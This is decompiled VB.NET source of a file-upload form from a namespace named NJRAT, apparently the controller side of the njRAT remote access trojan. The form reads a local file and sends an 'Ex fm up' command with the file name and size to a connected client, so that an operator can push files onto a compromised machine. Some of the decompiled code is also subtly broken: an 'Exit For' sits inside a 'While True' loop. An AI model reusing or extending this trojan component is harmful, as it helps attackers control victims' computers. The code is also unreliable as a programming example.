Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Microsoft.VisualBasic.CompilerServices

Namespace NJRAT
	' Token: 0x02000024 RID: 36
	<DesignerGenerated()>
	Public Partial Class up
		Inherits Form

		' Token: 0x0600053E RID: 1342 RVA: 0x0002AACC File Offset: 0x00028CCC
		<DebuggerNonUserCode()>
		Private Shared Sub __ENCAddToList(value As Object)
			Dim _ENCList As List(Of WeakReference) = up.__ENCList
			SyncLock _ENCList
				If up.__ENCList.Count = up.__ENCList.Capacity Then
					Dim num As Integer = 0
					Dim num2 As Integer = 0
					Dim num3 As Integer = up.__ENCList.Count - 1
					Dim num4 As Integer = num2
					While True
						Dim num5 As Integer = num4
						Dim num6 As Integer = num3
						If num5 > num6 Then
							Exit For
						End If
						Dim weakReference As WeakReference = up.__ENCList(num4)
						If weakReference.IsAlive Then
							If num4 <> num Then
								up.__ENCList(num) = up.__ENCList(num4)
							End If
							num += 1
						End If
						num4 += 1
					End While
					up.__ENCList.RemoveRange(num, up.__ENCList.Count - num)
					up.__ENCList.Capacity = up.__ENCList.Count
				End If
				up.__ENCList.Add(New WeakReference(RuntimeHelpers.GetObjectValue(value)))
			End SyncLock
		End Sub

		' Token: 0x170001E4 RID: 484
		' (get) Token: 0x06000541 RID: 1345 RVA: 0x0002AF9C File Offset: 0x0002919C
		' (set) Token: 0x06000542 RID: 1346 RVA: 0x000037F0 File Offset: 0x000019F0
		Friend Overridable Property ProgressBar1 As ProgressBar
			<DebuggerNonUserCode()>
			Get
				Return Me._ProgressBar1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ProgressBar)
				Me._ProgressBar1 = value
			End Set
		End Property

		' Token: 0x170001E5 RID: 485
		' (get) Token: 0x06000543 RID: 1347 RVA: 0x0002AFB4 File Offset: 0x000291B4
		' (set) Token: 0x06000544 RID: 1348 RVA: 0x0002AFCC File Offset: 0x000291CC
		Friend Overridable Property Button1 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button1_Click
				If Me._Button1 IsNot Nothing Then
					RemoveHandler Me._Button1.Click, value2
				End If
				Me._Button1 = value
				If Me._Button1 IsNot Nothing Then
					AddHandler Me._Button1.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170001E6 RID: 486
		' (get) Token: 0x06000545 RID: 1349 RVA: 0x0002B024 File Offset: 0x00029224
		' (set) Token: 0x06000546 RID: 1350 RVA: 0x000037F9 File Offset: 0x000019F9
		Friend Overridable Property Lv1 As GClass9
			<DebuggerNonUserCode()>
			Get
				Return Me._Lv1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As GClass9)
				Me._Lv1 = value
			End Set
		End Property

		' Token: 0x170001E7 RID: 487
		' (get) Token: 0x06000547 RID: 1351 RVA: 0x0002B03C File Offset: 0x0002923C
		' (set) Token: 0x06000548 RID: 1352 RVA: 0x0002B054 File Offset: 0x00029254
		Friend Overridable Property vmethod_4 As Timer
			<DebuggerNonUserCode()>
			Get
				Return Me._vmethod_4
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Timer)
				Dim value2 As EventHandler = AddressOf Me.vmethod_4_Tick
				If Me._vmethod_4 IsNot Nothing Then
					RemoveHandler Me._vmethod_4.Tick, value2
				End If
				Me._vmethod_4 = value
				If Me._vmethod_4 IsNot Nothing Then
					AddHandler Me._vmethod_4.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x170001E8 RID: 488
		' (get) Token: 0x06000549 RID: 1353 RVA: 0x0002B0AC File Offset: 0x000292AC
		' (set) Token: 0x0600054A RID: 1354 RVA: 0x00003802 File Offset: 0x00001A02
		Friend Overridable Property ColumnHeader1 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader1 = value
			End Set
		End Property

		' Token: 0x170001E9 RID: 489
		' (get) Token: 0x0600054B RID: 1355 RVA: 0x0002B0C4 File Offset: 0x000292C4
		' (set) Token: 0x0600054C RID: 1356 RVA: 0x0000380B File Offset: 0x00001A0B
		Friend Overridable Property ColumnHeader2 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader2 = value
			End Set
		End Property

		' Token: 0x0600054D RID: 1357 RVA: 0x0002B0DC File Offset: 0x000292DC
		Public Sub New()
			AddHandler MyBase.FormClosing, AddressOf Me.up_FormClosing
			AddHandler MyBase.Load, AddressOf Me.up_Load
			up.__ENCAddToList(Me)
			Me.Closinge = False
			Me.os = 0
			Me.InitializeComponent()
		End Sub

		' Token: 0x0600054E RID: 1358 RVA: 0x0000276C File Offset: 0x0000096C
		Private Sub Button1_Click(sender As Object, e As EventArgs)
			Me.Close()
		End Sub

		' Token: 0x0600054F RID: 1359 RVA: 0x0002B130 File Offset: 0x00029330
		Private Sub up_FormClosing(sender As Object, e As FormClosingEventArgs)
			Me.Closinge = True
			Try
				Me.FS.Close()
				Me.FS.Dispose()
			Catch ex As Exception
			End Try
			Try
				Me.sk.Close()
			Catch ex2 As Exception
			End Try
		End Sub

		' Token: 0x06000550 RID: 1360 RVA: 0x0002B1A4 File Offset: 0x000293A4
		Private Sub up_Load(sender As Object, e As EventArgs)
			Me.FS = New FileStream(Me.TMP, FileMode.Open)
			Me.Lv1.Items(0).SubItems(0).Text = New FileInfo(Me.TMP).Name
			Me.Lv1.Items(1).SubItems(0).Text = Class6.smethod_17(CLng(Me.SZ))
			Me.Lv1.Items(2).SubItems(0).Text = Class6.smethod_17(0L)
			Me.Lv1.Items(3).SubItems(0).Text = Class6.smethod_17(0L)
			Me.ProgressBar1.Maximum = Me.SZ
			Me.osk.Send(String.Concat(New String() { "Ex", Class7.string_1, "fm", Class7.string_1, "up", Class7.string_1, Me.osk.ip(), Class7.string_1, Class6.smethod_14(Me.FN), Class7.string_1, Conversions.ToString(Me.SZ) }))
			Me.Lv1.method_3()
			Me.vmethod_4.Enabled = True
		End Sub

		' Token: 0x06000551 RID: 1361 RVA: 0x0002B330 File Offset: 0x00029530
		Private Sub vmethod_4_Tick(sender As Object, e As EventArgs)
			Try
				Me.Lv1.Items(2).SubItems(1).Text = Class6.smethod_17(CLng((Me.ProgressBar1.Value - Me.os)))
				Me.os = Me.ProgressBar1.Value
				Me.Lv1.Items(3).SubItems(1).Text = Class6.smethod_17(CLng(Me.ProgressBar1.Value))
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x04000279 RID: 633
		Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)()

		' Token: 0x0400027B RID: 635
		<AccessedThroughProperty("ProgressBar1")>
		Private _ProgressBar1 As ProgressBar

		' Token: 0x0400027C RID: 636
		<AccessedThroughProperty("Button1")>
		Private _Button1 As Button

		' Token: 0x0400027D RID: 637
		<AccessedThroughProperty("Lv1")>
		Private _Lv1 As GClass9

		' Token: 0x0400027E RID: 638
		<AccessedThroughProperty("vmethod_4")>
		Private _vmethod_4 As Timer

		' Token: 0x0400027F RID: 639
		<AccessedThroughProperty("ColumnHeader1")>
		Private _ColumnHeader1 As ColumnHeader

		' Token: 0x04000280 RID: 640
		<AccessedThroughProperty("ColumnHeader2")>
		Private _ColumnHeader2 As ColumnHeader

		' Token: 0x04000281 RID: 641
		Public Closinge As Boolean

		' Token: 0x04000282 RID: 642
		Public FN As String

		' Token: 0x04000283 RID: 643
		Public FS As FileStream

		' Token: 0x04000284 RID: 644
		Public os As Integer

		' Token: 0x04000285 RID: 645
		Public osk As Client

		' Token: 0x04000286 RID: 646
		Public sk As Client

		' Token: 0x04000287 RID: 647
		Public SZ As Integer

		' Token: 0x04000288 RID: 648
		Public TMP As String
	End Class
End Namespace
